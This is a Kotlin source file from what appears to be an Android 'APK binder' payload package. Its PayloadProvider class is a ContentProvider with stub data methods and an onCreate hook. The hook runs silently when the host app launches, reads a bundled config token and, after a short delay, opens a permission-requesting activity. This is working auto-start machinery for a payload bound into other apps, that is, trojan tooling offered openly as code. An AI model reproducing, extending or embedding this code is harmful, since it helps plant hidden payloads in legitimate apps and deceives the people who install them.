package Com.devhs.apkbinder.payload

import android.content.ContentProvider
import android.content.ContentValues
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import Com.devhs.apkbinder.core.Const
import org.json.JSONObject

class PayloadProvider : ContentProvider() {

    override fun onCreate(): Boolean {
        val ctx = context ?: return true
        val cfg = try {
            ctx.assets.open(Const.CONFIG_ASSET).use { JSONObject(it.readBytes().decodeToString()) }
        } catch (_: Throwable) {
            null
        }
        if (cfg == null || cfg.optString("token").isEmpty()) return true
        PayloadState.config = cfg

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                ctx.startActivity(
                    Intent(ctx, PermissionGateActivity::class.java)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
            } catch (_: Throwable) {
            }
        }, 1200)

        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<out String>?,
        selection: String?,
        selectionArgs: Array<out String>?,
        sortOrder: String?
    ): Cursor? = null

    override fun getType(uri: Uri): String? = null

    override fun insert(uri: Uri, values: ContentValues?): Uri? = null

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0

    override fun update(
        uri: Uri,
        values: ContentValues?,
        selection: String?,
        selectionArgs: Array<out String>?
    ): Int = 0
}
